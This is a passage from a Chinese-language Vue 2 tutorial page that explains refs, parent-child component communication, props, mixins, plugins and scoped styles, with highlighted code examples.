href="https://cli.vuejs.org/zh">https://cli.vuejs.org/zh</a></li></ol><h2 id="ref属性-1"><a href="#ref属性-1" class="headerlink" title="ref属性"></a>ref属性</h2><ol><li>被用来给元素或子组件注册引用信息（id的替代者）</li><li>应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）</li><li>使用方式：<ol><li>打标识：<code>&lt;h1 ref=&quot;xxx&quot;&gt;.....&lt;/h1&gt;</code> 或 <code>&lt;School ref=&quot;xxx&quot;&gt;&lt;/School&gt;</code></li><li>获取：<code>this.$refs.xxx</code></li></ol></li></ol><ul><li>基本用法，本页面获取dom元素</li></ul><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202201011803.webp" alt="img"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">ref</span>=<span class="string">&quot;testDom&quot;</span>&gt;</span>11111<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;getTest&quot;</span>&gt;</span>获取test节点<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  <span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="function"><span class="title">getTest</span>(<span class="params"></span>)</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">      <span class="built_in">console</span>.log(<span class="built_in">this</span>.$refs.testDom)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li><p>获取子组件中的data</p><p><strong>子组件</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">      &#123;&#123; msg &#125;&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">return</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">      <span class="attr">msg</span>: <span class="string">&quot;hello world&quot;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>父组件</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">HelloWorld</span> <span class="attr">ref</span>=<span class="string">&quot;hello&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;getHello&quot;</span>&gt;</span>获取helloworld组件中的值<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">import</span> HelloWorld <span class="keyword">from</span> <span class="string">&quot;./components/HelloWorld.vue&quot;</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  <span class="attr">components</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    HelloWorld</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">return</span> &#123;&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  <span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="function"><span class="title">getHello</span>(<span class="params"></span>)</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">      <span class="built_in">console</span>.log(<span class="built_in">this</span>.$refs.hello.msg)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202201021763.webp" alt="img"></p></li><li><p>调用子组件中的方法</p><p><strong>子组件</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  <span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="function"><span class="title">open</span>(<span class="params"></span>)</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">      <span class="built_in">console</span>.log(<span class="string">&quot;调用到了&quot;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>父组件</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">HelloWorld</span> <span class="attr">ref</span>=<span class="string">&quot;hello&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;getHello&quot;</span>&gt;</span>获取helloworld组件中的值<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">import</span> HelloWorld <span class="keyword">from</span> <span class="string">&quot;./components/HelloWorld.vue&quot;</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  <span class="attr">components</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    HelloWorld</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">return</span> &#123;&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  <span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="function"><span class="title">getHello</span>(<span class="params"></span>)</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">      <span class="built_in">this</span>.$refs.hello.open();</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202201022406.webp" alt="img"></p></li><li><p>子组件调用父组件方法</p><p><strong>子组件</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  <span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="function"><span class="title">open</span>(<span class="params"></span>)</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">      <span class="built_in">console</span>.log(<span class="string">&quot;调用了&quot;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">      <span class="comment">//  调用父组件方法</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">      <span class="built_in">this</span>.$emit(<span class="string">&quot;refreshData&quot;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li></ul><p><strong>父组件</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">HelloWorld</span> <span class="attr">ref</span>=<span class="string">&quot;hello&quot;</span> @<span class="attr">refreshData</span>=<span class="string">&quot;getData&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;getHello&quot;</span>&gt;</span>获取helloworld组件中的值<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">import</span> HelloWorld <span class="keyword">from</span> <span class="string">&quot;./components/HelloWorld.vue&quot;</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  <span class="attr">components</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    HelloWorld</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">return</span> &#123;&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  <span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="function"><span class="title">getHello</span>(<span class="params"></span>)</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">      <span class="built_in">this</span>.$refs.hello.open()</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="function"><span class="title">getData</span>(<span class="params"></span>)</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">      <span class="built_in">console</span>.log(<span class="string">&#x27;111111&#x27;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202201023185.webp" alt="img"></p><h2 id="props配置项"><a href="#props配置项" class="headerlink" title="props配置项"></a>props配置项</h2><p>app.vue</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    //此时age是key和value形式，这样使用props会报错</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">Student</span> <span class="attr">name</span>=<span class="string">&#x27;zx&#x27;</span> <span class="attr">sex</span>=<span class="string">&#x27;男&#x27;</span> <span class="attr">age</span>=<span class="string">&#x27;18&#x27;</span>/&gt;</span></span></span><br><span class="line"><span class="xml">   //写成这种形式就是v-bind,会把age中的当成表达式</span></span><br><span class="line"><span class="xml">//<span class="tag">&lt;<span class="name">Student</span> <span class="attr">name</span>=<span class="string">&#x27;zx&#x27;</span> <span class="attr">sex</span>=<span class="string">&#x27;男&#x27;</span> <span class="attr">:age</span>=<span class="string">&#x27;18&#x27;</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">Student</span> <span class="attr">name</span>=<span class="string">&#x27;zxz&#x27;</span> <span class="attr">sex</span>=<span class="string">&#x27;男&#x27;</span> <span class="attr">age</span>=<span class="string">&#x27;18+1&#x27;</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">Student</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//引入School组件</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">import</span> Student <span class="keyword">from</span> <span class="string">&#x27;./components/School&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;App&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">components</span>:&#123;Student&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ol><li><p>功能：让组件接收外部传过来的数据</p></li><li><p>传递数据：<code>&lt;Demo name=&quot;xxx&quot;/&gt;</code></p></li><li><p>接收数据：</p><ol><li><p>第一种方式（只接收）：<code>props:[&#39;name&#39;] </code></p></li><li><p>第二种方式（限制类型）：<code>props:&#123;name:String&#125;</code></p></li><li><p>第三种方式（限制类型、限制必要性、指定默认值）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">props:&#123;</span><br><span class="line"><span class="attr">name</span>:&#123;</span><br><span class="line"><span class="attr">type</span>:<span class="built_in">String</span>, <span class="comment">//类型</span></span><br><span class="line"><span class="attr">required</span>:<span class="literal">true</span>, <span class="comment">//必要性</span></span><br><span class="line"><span class="attr">default</span>:<span class="string">&#x27;老王&#x27;</span> <span class="comment">//默认值</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。</p><p>props不能检测到对象里面某一个属性的修改，只能检测到整体的修改</p></blockquote></li></ol><h2 id="mixin-混入"><a href="#mixin-混入" class="headerlink" title="mixin(混入)"></a>mixin(混入)</h2><ol><li><p>功能：可以把多个组件共用的配置提取成一个混入对象</p></li><li><p>使用方式：</p><p>第一步定义混合：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    data()&#123;....&#125;,</span><br><span class="line">    methods:&#123;....&#125;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二步使用混入：</p><p>​    全局混入：<code>Vue.mixin(xxx)</code><br>​    局部混入：<code>mixins:[&#39;xxx&#39;]    </code></p></li></ol><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>Vue.js 的插件应该暴露一个 <code>install</code> 方法。这个方法的第一个参数是 <code>Vue</code> 构造器，第二个参数是一个可选的选项对象：</p><ol><li>功能：用于增强Vue</li><li>本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。</li><li>定义插件：</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">MyPlugin.install = <span class="function"><span class="keyword">function</span> (<span class="params">Vue, options</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 1. 添加全局方法或 property</span></span><br><span class="line">  Vue.myGlobalMethod = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 逻辑...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2. 添加全局资源</span></span><br><span class="line">  Vue.directive(<span class="string">&#x27;my-directive&#x27;</span>, &#123;</span><br><span class="line">    bind (el, binding, vnode, oldVnode) &#123;</span><br><span class="line">      <span class="comment">// 逻辑...</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3. 注入组件选项</span></span><br><span class="line">  Vue.mixin(&#123;</span><br><span class="line">    <span class="attr">created</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="comment">// 逻辑...</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 4. 添加实例方法</span></span><br><span class="line">  Vue.prototype.$myMethod = <span class="function"><span class="keyword">function</span> (<span class="params">methodOptions</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 逻辑...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">对象.install = <span class="function"><span class="keyword">function</span> (<span class="params">Vue, options</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 添加全局过滤器</span></span><br><span class="line">    Vue.filter(....)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 添加全局指令</span></span><br><span class="line">    Vue.directive(....)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 配置全局混入(合)</span></span><br><span class="line">    Vue.mixin(....)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 添加实例方法</span></span><br><span class="line">    Vue.prototype.$myMethod = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;...&#125;</span><br><span class="line">    Vue.prototype.$myProperty = xxxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>使用插件：<code>Vue.use()</code></li></ol><h2 id="scoped样式"><a href="#scoped样式" class="headerlink" title="scoped样式"></a>scoped样式</h2><ol><li>作用：让样式在局部生效，防止冲突。</li><li>写法：<code>&lt;style scoped&gt;</code></li></ol><h2 id="总结TodoList案例"><a href="#总结TodoList案例" class="headerlink" title="总结TodoList案例"></a>总结TodoList案例</h2><h3 id="event-target的常用属性总结如下"><a href="#event-target的常用属性总结如下" class="headerlink" title="event.target的常用属性总结如下"></a>event.target的常用属性总结如下</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span></span></span><br><span class="line"><span class="css"><span class="xml">            <span class="selector-id">#main</span> &#123;</span></span></span><br><span class="line"><span class="css"><span class="xml">                <span class="attribute">width</span>: <span class="number">200px</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml">                <span class="attribute">height</span>: <span class="number">100px</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml">                <span class="attribute">background</span>: pink;</span></span></span><br><span class="line"><span class="css"><span class="xml">                <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="css"><span class="xml">        </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="xml">      